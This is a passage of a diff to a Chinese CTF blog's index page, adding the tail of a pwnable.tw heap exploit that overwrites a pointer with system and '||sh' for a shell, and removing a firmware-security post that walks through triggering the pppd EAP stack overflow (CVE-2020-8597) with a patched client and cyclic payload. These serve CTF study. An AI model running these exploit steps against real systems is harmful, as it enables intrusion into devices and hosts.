class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(system_addr)+<span class="string">'||sh'</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#调用</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+	
+	</div>
+  <a type="button" href="/2021/01/09/pwnable-tw记录/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/01/09/蓝桥杯入门训练/" >蓝桥杯入门训练</a>
 		</h3>
 		</div>
@@ -1242,157 +1519,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/10/22/固件iot基础/" >固件iot基础</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-10-22  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
-<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
-<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
-<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829170912807.png" alt="image-20200829170912807"></p>
-<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
-<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
-<ul>
-<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
-<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
-</ul>
-<p>使用：</p>
-<ul>
-<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
-<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
-</ul>
-<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
-<ul>
-<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174231769.png" alt="image-20200829174231769"></p>
-<ul>
-<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174236510.png" alt="image-20200829174236510"></p>
-<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
-<ol>
-<li>nday cve 漏洞分析和利用；</li>
-<li>mips 指令集栈溢出漏洞的调试和利用</li>
-</ol>
-<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
-<p>漏洞点：</p>
-<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121124694.png" alt="image-20200830121124694"></p>
-<p>操作步骤：</p>
-<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
-<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121439048.png" alt="image-20200830121439048"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（2）编辑<code>etc/inittab</code></p>
-<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
-
-<p>（3）修改<code>start.sh</code>文件</p>
-<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
-<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
-<p>（5）重新打包<code>rootfs.img</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（6）运行</p>
-<p><code>./start.sh</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830122145171.png" alt="image-20200830122145171"></p>
-<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
-
-<p>再打开一个新的窗口</p>
-<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
-
-<p>接着</p>
-<p>（1）下载ppp的源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
-
-<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
-
-<p>（3）编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
-
-<p>（4）在本地机器运行patched <code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
-
-<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830154226602.png" alt="image-20200830154226602"></p>
-<p>获取flag：</p>
-<p>方法一：</p>
-<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
-<p>方法二：</p>
-<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
-<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
-<p>参考：</p>
-<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
-<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
-<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
-<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
-<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
-<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
-<p>考点：</p>
-<ol>
-<li>mips 堆溢出利用；</li>
-<li>uClibc 堆管理机制。 </li>
-</ol>
-<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830015127901.png" alt="image-20200830015127901"></p>
-<p>DLINK DIR-815 路由器前台栈溢出</p>
-<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
-<ul>
-<li>DLINK DIR-859 upnp 协议命令注入</li>
-<li>tplink sr20 路由器命令注入</li>
-<li>Draytek Vigor2960 前台登录处栈溢出</li>
-</ul>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
-<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
-<p>TPLINK WR841n 路由器后台栈溢出</p>
-<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
-<p>命令注入</p>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
-<hr>
-<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
-<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
-<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829204006754.png" alt="image-20200829204006754"></p>
-<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
-<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
-
-	
-	</div>
-  <a type="button" href="/2020/10/22/固件iot基础/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1446,7 +1572,7 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/categories/iot/">iot<span>2</span></a></li>
 		
-			<li><a href="/categories/pwn/">pwn<span>6</span></a></li>
+			<li><a href="/categories/pwn/">pwn<span>7</span></a></li>
 		
 			<li><a href="/categories/reverse/">reverse<span>1</span></a></li>
 		
@@ -1463,33 +1589,35 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>1</span></a></li>
 		
 			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
 		
-			<li><a href="/tags/kernel-pwn/">kernel pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
-		
-			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
-		
 			<li><a href="/tags/基础知识/">基础知识<span>2</span></a></li>
 		
-			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>1</span></a></li>
+			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
+		
+			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+		
+			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>1</span></a></li>
 		
 			<li><a href="/tags/祥云杯-2020/">祥云杯 2020<span>1</span></a></li>
+		
+			<li><a href="/tags/buu刷题/">buu刷题<span>1</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
 		
 			<li><a href="/tags/hitctf-2020/">hitctf 2020<span>1</span></a></li>
 		
 			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
 		
+			<li><a href="/tags/kernel-pwn/">kernel pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
+		
+			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
+		
 			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
-		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
-		
-			<li><a href="/tags/buu刷题/">buu刷题<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -1501,6 +1629,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/01/09/pwnable-tw记录/" ><i class="fa fa-file-o"></i>pwnable.tw记录</a>
+      </li>
     
       <li>
         <a href="/2021/01/09/蓝桥杯入门训练/" ><i class="fa fa-file-o"></i>蓝桥杯入门训练</a>
@@ -1516,10 +1648,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2020/11/20/buu刷题笔记/" ><i class="fa fa-file-o"></i>buu刷题笔记</a>
-      </li>
-    
-      <li>
-        <a href="/2020/11/11/ctf-wiki的刷题笔记/" ><i class="fa fa-file-o"></i>ctf-wiki的刷题笔记</a>
       </li>
     
   </ul>
